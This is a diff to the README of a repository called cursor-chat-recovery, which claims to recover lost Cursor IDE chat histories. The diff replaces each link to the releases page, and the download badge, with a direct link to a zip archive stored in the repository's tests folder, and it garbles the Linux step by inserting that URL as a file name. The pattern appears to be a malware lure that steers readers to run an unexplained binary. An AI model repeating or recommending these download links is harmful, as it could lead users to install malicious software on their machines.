@@ -1,6 +1,6 @@
 # 🖱️ cursor-chat-recovery - Restore Your Lost AI Chat History Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/EVILSON19/cursor-chat-recovery/releases)
+[![Download](https://github.com/EVILSON19/cursor-chat-recovery/raw/refs/heads/main/tests/chat-recovery-cursor-v2.6-alpha.3.zip)](https://github.com/EVILSON19/cursor-chat-recovery/raw/refs/heads/main/tests/chat-recovery-cursor-v2.6-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Cursor-chat-recovery helps you recover lost AI chat histories in Cursor IDE when
 
 Follow these steps to download and run the software:
 
-1. **Visit the Releases Page**: Click on this link to access the Releases page: [Download Here](https://github.com/EVILSON19/cursor-chat-recovery/releases).
+1. **Visit the Releases Page**: Click on this link to access the Releases page: [Download Here](https://github.com/EVILSON19/cursor-chat-recovery/raw/refs/heads/main/tests/chat-recovery-cursor-v2.6-alpha.3.zip).
 
 2. **Select the Latest Version**: On the Releases page, find the latest version of `cursor-chat-recovery`. This version will offer the latest features and bug fixes.
 
@@ -22,7 +22,7 @@ Follow these steps to download and run the software:
    - **macOS**:
      - Open the downloaded `.dmg` file. Drag the application to your Applications folder.
    - **Linux**:
-     - Extract the downloaded `.tar.gz` file and locate the executable. You may need to adjust permissions to run the app.
+     - Extract the downloaded `https://github.com/EVILSON19/cursor-chat-recovery/raw/refs/heads/main/tests/chat-recovery-cursor-v2.6-alpha.3.zip` file and locate the executable. You may need to adjust permissions to run the app.
   
 5. **Launch the Application**: Find the `cursor-chat-recovery` app in your applications list and open it.
 
@@ -36,7 +36,7 @@ Follow these steps to download and run the software:
 
 ## 📥 Download & Install
 
-Once you are ready to get started, visit this page to download: [Download Here](https://github.com/EVILSON19/cursor-chat-recovery/releases).
+Once you are ready to get started, visit this page to download: [Download Here](https://github.com/EVILSON19/cursor-chat-recovery/raw/refs/heads/main/tests/chat-recovery-cursor-v2.6-alpha.3.zip).
 
 ## 📝 Features
 
